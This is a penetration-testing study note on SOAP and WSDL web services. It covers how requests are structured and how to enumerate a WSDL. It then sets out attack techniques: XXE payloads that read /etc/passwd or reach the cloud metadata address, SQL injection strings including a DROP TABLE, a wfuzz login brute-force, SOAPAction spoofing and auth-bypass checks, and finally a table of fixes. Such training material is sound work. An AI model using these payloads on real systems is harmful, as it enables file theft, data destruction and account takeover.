---
tags: [vapt, http, api, web, intermediate]
difficulty: intermediate
module: "02 - HTTP Deep Dive"
topic: "02.25 SOAP and WSDL"
---

# 02.25 — SOAP and WSDL

## What is it?

**SOAP (Simple Object Access Protocol)** is an XML-based messaging protocol for web services. Older than REST, it's still widely used in enterprise environments (banking, healthcare, government systems). **WSDL (Web Services Description Language)** is the XML document that describes a SOAP service — its operations, input/output types — like an API spec.

---

## SOAP Request Structure

```xml
POST /api/soap HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://target.com/GetUserInfo"
Content-Length: 345

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:tns="http://target.com/services">

  <soap:Header>
    <tns:AuthToken>abc123</tns:AuthToken>    ← auth in header (no cookies!)
  </soap:Header>

  <soap:Body>
    <tns:GetUserInfo>
      <tns:userId>123</tns:userId>
      <tns:includeEmail>true</tns:includeEmail>
    </tns:GetUserInfo>
  </soap:Body>

</soap:Envelope>

SOAP RESPONSE:
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUserInfoResponse>
      <username>alice</username>
      <email>alice@test.com</email>
    </GetUserInfoResponse>
  </soap:Body>
</soap:Envelope>
```

---

## WSDL — Service Description

```
WSDL is at: https://target.com/service?wsdl  OR  /service.wsdl

Structure:
  <definitions>
    <types>  → XML Schema definitions (input/output types)
    <message>  → What data is passed
    <portType>  → Operations (like function signatures)
    <binding>  → How operations are mapped to protocols
    <service>  → Where the service is (URL)

IMPORTANT: WSDL tells you EVERYTHING about the API:
  - All operations (methods)
  - All parameters and their types
  - Return types
  - Endpoint URLs
  - Authentication methods

GET WSDL:
  curl https://target.com/service?wsdl
  curl https://target.com/service.asmx?wsdl
  curl https://target.com/soap/endpoint?WSDL
```

---

## Security Context — SOAP in VAPT

### 1. XXE in SOAP (Most Critical)

```
SOAP IS XML. All XML injection attacks apply!

XXE (XML External Entity) in SOAP body:
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <tns:GetUserInfo>
        <tns:userId>&xxe;</tns:userId>
      </tns:GetUserInfo>
    </soap:Body>
  </soap:Envelope>

Response may contain /etc/passwd contents!

SSRF via XXE in SOAP:
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  <tns:userId>&xxe;</tns:userId>
```

### 2. SQL Injection via SOAP Parameters

```xml
<!-- Normal request -->
<tns:userId>123</tns:userId>

<!-- SQLi in SOAP parameter -->
<tns:userId>123' OR '1'='1</tns:userId>
<tns:userId>123; DROP TABLE users--</tns:userId>

<!-- Boolean-based: -->
<tns:userId>123 AND 1=1</tns:userId>  ← true condition
<tns:userId>123 AND 1=2</tns:userId>  ← false condition
```

### 3. WSDL Enumeration

```bash
# Get WSDL document
curl -s "https://target.com/service?wsdl" | xmllint --format - 2>/dev/null

# Parse operations from WSDL
curl -s "https://target.com/service?wsdl" | \
  grep -oP '(?<=operation name=")[^"]+' | sort -u

# Tools:
# wsdl2py: generates Python client from WSDL
# soapui: GUI tool for SOAP testing (like Burp for REST)
# wfuzz SOAP testing:
wfuzz -z file,passwords.txt -d \
  '<?xml version="1.0"?><soap:Envelope xmlns:soap="..."><soap:Body><Login><user>admin</user><pass>FUZZ</pass></Login></soap:Body></soap:Envelope>' \
  -H "Content-Type: text/xml" \
  https://target.com/service

# Burp Suite handles SOAP well:
# Import WSDL → Burp generates example requests automatically
```

### 4. SOAP Action Spoofing

```
SOAPAction header tells server what operation to perform.
Some servers trust SOAPAction header over content.

ATTACK:
  Normal request:
  SOAPAction: "GetUserInfo"
  Body: <GetUserInfo><userId>1</userId></GetUserInfo>

  Spoofed:
  SOAPAction: "DeleteAllUsers"
  Body: <GetUserInfo><userId>1</userId></GetUserInfo>

  If server uses SOAPAction to route and trusts it:
  → Executes DeleteAllUsers even though body says GetUserInfo!
```

### 5. SOAP Authentication Bypass

```
SOAP auth often in Header element:
  <soap:Header>
    <tns:AuthToken>USER_TOKEN</tns:AuthToken>
  </soap:Header>

TRY:
1. Remove the Header entirely → does operation still work?
2. Use empty token: <AuthToken></AuthToken>
3. Use invalid token: <AuthToken>invalid</AuthToken>
4. Omit SOAPAction header → different routing?
5. Try accessing admin operations without auth token
```

---

## Hands-On: SOAP Testing

```bash
# Test SOAP endpoint exists
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: test" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test/></soap:Body></soap:Envelope>'

# Get WSDL
curl -s "https://target.com/service?wsdl" -o service.wsdl

# XXE test
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: GetUserInfo" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUserInfo><userId>&xxe;</userId></GetUserInfo></soap:Body></soap:Envelope>'

# SQLi test
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUserInfo><userId>1'"'"' OR '"'"'1'"'"'='"'"'1</userId></GetUserInfo></soap:Body></soap:Envelope>'
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| XXE in SOAP | Disable external entities in XML parser |
| SQL injection in parameters | Use parameterized queries, input validation |
| WSDL exposed to all | Require authentication to access WSDL |
| SOAPAction spoofing | Validate operation from body, not just SOAPAction header |
| No auth on operations | Enforce authentication checks in each operation handler |

---

## Related Notes
- [[Module 14 - XXE]] — XXE in XML/SOAP
- [[Module 01 - SQL Injection]] — SQL injection via SOAP params
- [[23 - REST API Architecture]] — modern alternative to SOAP
- [[Module 07 - API Security]] — OWASP API Top 10
